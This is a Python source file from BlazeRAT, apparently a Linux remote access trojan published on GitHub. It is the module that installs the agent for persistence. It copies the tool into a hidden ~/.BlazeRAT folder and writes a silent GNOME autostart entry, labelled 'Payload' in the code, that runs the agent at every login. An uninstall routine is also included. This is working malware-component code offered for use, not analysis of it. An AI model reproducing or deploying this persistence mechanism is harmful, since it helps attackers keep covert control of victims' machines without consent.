#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from sys import argv
from shutil import copytree, rmtree
from os import path, chdir, mkdir, remove

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed
    to install the program to startup.
"""


# Installation path settings
HOME_DIRECTORY = path.expanduser('~')
INSTALL_DIRECTORY = path.join(HOME_DIRECTORY, ".BlazeRAT")
CURRENT_DIRECTORY = path.dirname(path.realpath(argv[0]))
# Autorun path settings
AUTORUN_DIRECTORY = path.join(HOME_DIRECTORY, ".config/autostart")
AUTORUN_SHORTCUT = path.join(AUTORUN_DIRECTORY, "BlazeRAT.desktop")

# Go to current working directory
chdir(CURRENT_DIRECTORY)

# Create autostart directory if not exists
if not path.exists(AUTORUN_DIRECTORY):
    mkdir(AUTORUN_DIRECTORY)

""" Check if service is installed """
def ServiceInstalled() -> bool:
    installed = path.exists(INSTALL_DIRECTORY)
    startup = path.exists(AUTORUN_SHORTCUT)
    status = installed and startup
    return status

""" Install service """
def ServiceInstall() -> str:
    print("[*] Installing service...")
    # Payload
    shortcut = (f"""
        [Desktop Entry]
        Name=BlazeRAT
        Comment=Remote Administration Tool
        Exec=/usr/bin/python3 {path.join(INSTALL_DIRECTORY, "main.py")}
        Type=Application
        Terminal=false
        StartupNotify=false
        X-GNOME-Autostart-enabled=true
    """)
    # Copy files to install directory
    if not path.exists(INSTALL_DIRECTORY):
        copytree(CURRENT_DIRECTORY, INSTALL_DIRECTORY)
    # Write shortcut
    if not path.exists(AUTORUN_SHORTCUT):
        with open(AUTORUN_SHORTCUT, "w") as file:
            file.write(shortcut)
    # Done
    return "[+] BlazeRAT agent is installed"

""" Uninstall service """
def ServiceUninstall() -> str:
    print("[*] Uninstalling service...")
    # Remove shortcut
    if path.exists(AUTORUN_SHORTCUT):
        remove(AUTORUN_SHORTCUT)
    # Remove installation directory
    if path.exists(INSTALL_DIRECTORY):
        rmtree(INSTALL_DIRECTORY)
    # Done
    return "[+] BlazeRAT agent uninstalled"
